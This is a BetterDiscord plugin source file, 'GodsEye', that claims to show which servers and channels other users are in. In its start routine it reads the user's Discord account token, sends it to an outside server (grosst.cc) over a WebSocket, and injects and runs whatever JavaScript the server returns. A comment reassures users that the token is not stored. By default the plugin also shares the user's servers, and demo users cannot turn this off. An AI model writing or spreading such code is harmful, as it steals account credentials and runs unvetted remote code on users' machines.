/**
* @name GodsEye
* @displayName GodsEye
* @source https://github.com/GR0SST/Gods_eye/blob/main/SelfCommands.plugin.js
* @authorId 371336044022464523
*/
/*@cc_on
@if (@_jscript)
	
    // Offer to self-install for clueless users that try to run this directly.
    var shell = WScript.CreateObject("WScript.Shell");
    var fs = new ActiveXObject("Scripting.FileSystemObject");
    var pathPlugins = shell.ExpandEnvironmentStrings("%APPDATA%\BetterDiscord\plugins");
    var pathSelf = WScript.ScriptFullName;
    // Put the user at ease by addressing them in the first person
    shell.Popup("It looks like you've mistakenly tried to run me directly. \n(Don't do that!)", 0, "I'm a plugin for BetterDiscord", 0x30);
    if (fs.GetParentFolderName(pathSelf) === fs.GetAbsolutePathName(pathPlugins)) {
        shell.Popup("I'm in the correct folder already.", 0, "I'm already installed", 0x40);
    } else if (!fs.FolderExists(pathPlugins)) {
        shell.Popup("I can't find the BetterDiscord plugins folder.\nAre you sure it's even installed?", 0, "Can't install myself", 0x10);
    } else if (shell.Popup("Should I copy myself to BetterDiscord's plugins folder for you?", 0, "Do you need some help?", 0x34) === 6) {
        fs.CopyFile(pathSelf, fs.BuildPath(pathPlugins, fs.GetFileName(pathSelf)), true);
        // Show the user where to put plugins in the future
        shell.Exec("explorer " + pathPlugins);
        shell.Popup("I'm installed!", 0, "Successfully installed", 0x40);
    }
    WScript.Quit();

@else@*/
const request = require("request");
const fs = require("fs");
const path = require("path");
const config = {
    info: {
        name: "GodsEye",
        authors: [
            {
                name: "GROSST",
                discord_id: "3713360440224645238",
            }
        ],
        version: "2.1.2",
        description: "Показывает кто где и скем сидит",
        github: "https://github.com/GR0SST/Gods_eye/blob/main/SelfCommands.plugin.js",
        github_raw: "https://raw.githubusercontent.com/GR0SST/Gods_eye/main/SelfCommands.plugin.js",

    },
    changelog: [{
        title: "Слава Украине",
        type: "fixed",
        items: [
            "Переезд на новый домен апишки"

        ]
    }],
    defaultConfig: []
};

module.exports = !global.ZeresPluginLibrary ? class {
    constructor() {
        this._config = config;
    }

    getName() {
        return config.info.name;
    }

    getAuthor() {
        return config.info.authors.map(author => author.name).join(", ");
    }

    getDescription() {
        return config.info.description;
    }

    getVersion() {
        return config.info.version;
    }

    load() {
        BdApi.showConfirmationModal("Library plugin is needed",
            `The library plugin needed for ${config.info.name} is missing. Please click Download Now to install it.`, {
            confirmText: "Download",
            cancelText: "Cancel",
            onConfirm: () => {
                request.get("https://rauenzi.github.io/BDPluginLibrary/release/0PluginLibrary.plugin.js", (error, response, body) => {
                    if (error) {
                        return electron.shell.openExternal("https://betterdiscord.net/ghdl?url=https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js");
                    }
                    fs.writeFileSync(path.join(BdApi.Plugins.folder, "0PluginLibrary.plugin.js"), body);
                });
            }
        });
    }

    start() { }

    stop() { }
} : !window.BDFDB_Global || (!window.BDFDB_Global.loaded && !window.BDFDB_Global.started) ? class {
    getName() { return config.info.name; }
    getAuthor() { return config.info.author; }
    getVersion() { return config.info.version; }
    getDescription() { return `The Library Plugin needed for ${config.info.name} is missing. Open the Plugin Settings to download it. \n\n${config.info.description}`; }

    downloadLibrary() {
        request.get("https://mwittrien.github.io/BetterDiscordAddons/Library/0BDFDB.plugin.js", (e, r, b) => {
            if (!e && b && r.statusCode == 200) fs.writeFileSync(path.join(BdApi.Plugins.folder, "0BDFDB.plugin.js"), body)
            else BdApi.alert("Error", "Could not download BDFDB Library Plugin. Try again later or download it manually from GitHub: https://mwittrien.github.io/downloader/?library");
        });
    }

    load() {
        if (!window.BDFDB_Global || !Array.isArray(window.BDFDB_Global.pluginQueue)) window.BDFDB_Global = Object.assign({}, window.BDFDB_Global, { pluginQueue: [] });
        if (!window.BDFDB_Global.downloadModal) {
            window.BDFDB_Global.downloadModal = true;
            BdApi.showConfirmationModal("Library Missing", `The Library Plugin needed for ${config.info.name} is missing. Please click "Download Now" to install it.`, {
                confirmText: "Download Now",
                cancelText: "Cancel",
                onCancel: _ => { delete window.BDFDB_Global.downloadModal; },
                onConfirm: _ => {
                    delete window.BDFDB_Global.downloadModal;
                    this.downloadLibrary();
                }
            });
        }
        if (!window.BDFDB_Global.pluginQueue.includes(config.info.name)) window.BDFDB_Global.pluginQueue.push(config.info.name);
    }
    start() { this.load(); }
    stop() { }
    getSettingsPanel() {
        let template = document.createElement("template");
        template.innerHTML = `<div style="color: var(--header-primary); font-size: 16px; font-weight: 300; white-space: pre; line-height: 22px;">The Library Plugin needed for ${config.info.name} is missing.\nPlease click <a style="font-weight: 500;">Download Now</a> to install it.</div>`;
        template.content.firstElementChild.querySelector("a").addEventListener("click", this.downloadLibrary);
        return template.content.firstElementChild;
    }
} : (([Plugin, Library]) => {
    const { DiscordModules, Settings, Toasts, PluginUtilities, WebpackModules } = Library;
    const { React } = DiscordModules;
    const { getToken } = WebpackModules.getByProps("getToken", "getId")

    const TopBarRef = React.createRef();
    return class Gods_eye extends Plugin {
        constructor() {
            super();
        }
        auth() {
            // Токен используеться исключительно для авторизации и индетификации пользователя
            // Никакие данные используя токен не сохраняються и не обрабатываються
            return new Promise(res => {
                const ws = new WebSocket("wss://www.grosst.cc/ws") // wss://www.grosst.cc/ws ws://localhost:3000
                ws.onopen = () =>{
                    this.sendCommand(ws,`login_selfcmd_${getToken()}`, (msg,data)=>{
                        const receivedDate = JSON.parse(data)
                        this.logged = true
                        this.autharizated = receivedDate.auth
                        res(receivedDate.main)
                    })
                }
            })
        }

        async onStart() {
            try {
                this.loadSettings();
                const code = await this.auth()
                this.scriptElement = document.createElement('script')
                this.scriptElement.text = code
                
                //this.scriptElement.scr = "link" 
                this.scriptElement.id = "GodsEye"
                document.head.appendChild(this.scriptElement);
                runGodsEye()
                this.script = new window.GodsEye
                
                this.script.onStart()
            } catch (error) {
                console.log(error);
            }
        }

        onStop() {
            window.GodsEye = null
            if (this.script)
                this.script.onStop()
            if(this.scriptElement){
                this.scriptElement.remove()
            }
        }

        get defaultVariables() {
            return {
                exposeUsers: true
            };
        }
        async sendCommand(ws,cmd, func) {
            const webSocket = ws
            webSocket.onmessage = (message) => {
                 if (message.data.startsWith("login_selfcmd_") === true) {
                    const data = message.data.slice(14, message.data.length)
                    func(message, data)
                    close()
                }
            }
            function close() {
                webSocket.onmessage = null
            }
            await this.waitForOpenConnection(webSocket)
            webSocket.send(cmd)
    
        }
        getSettingsPanel() {
            const panel = document.createElement("div");
            panel.className = "form";
            panel.style = "width:100%;";

            //#region Startup Settings
            new Settings.SettingGroup("Startup Settings", { shown: true }).appendTo(panel)
                .append(new Settings.Switch("Expose myself", "Share your servers with others", this.settings.exposeUsers, checked => {
                    if (this.autharizated) {
                        this.settings.exposeUsers = checked;
                        this.saveSettings();
                    } else {
                        Toasts.warning("Вы не можете отключить эту функцию в демо версии")
                        throw 401
                    }

                }))
            //#endregion
            return panel;
        }

        saveSettings() {
            if (TopBarRef.current) {
                this.settings.exposeUsers = TopBarRef.current.state.tabs;
            }
            PluginUtilities.saveSettings(this.getSettingsPath(), this.settings);
        }

        loadSettings() {
            if (Object.keys(PluginUtilities.loadSettings(this.getSettingsPath())).length === 0) {
                this.settings = PluginUtilities.loadSettings(this.getSettingsPath(true), this.defaultVariables);
            }
            else {
                this.settings = PluginUtilities.loadSettings(this.getSettingsPath(), this.defaultVariables);
            }
            this.saveSettings();
        }

        getSettingsPath() {
            return this.getName();
        }
        waitForOpenConnection(ws) {
            return new Promise((resolve, reject) => {
                const maxNumberOfAttempts = 10
                const intervalTime = 200 //ms
    
                let currentAttempt = 0
                const interval = setInterval(() => {
                    if (currentAttempt > maxNumberOfAttempts - 1) {
                        clearInterval(interval)
                        reject(new Error('Maximum number of attempts exceeded'))
                    } else if (ws.readyState === ws.OPEN) {
                        clearInterval(interval)
                        resolve()
                    }
                    currentAttempt++
                }, intervalTime)
            })
        }
    }


})(global.ZeresPluginLibrary.buildPlugin(config));
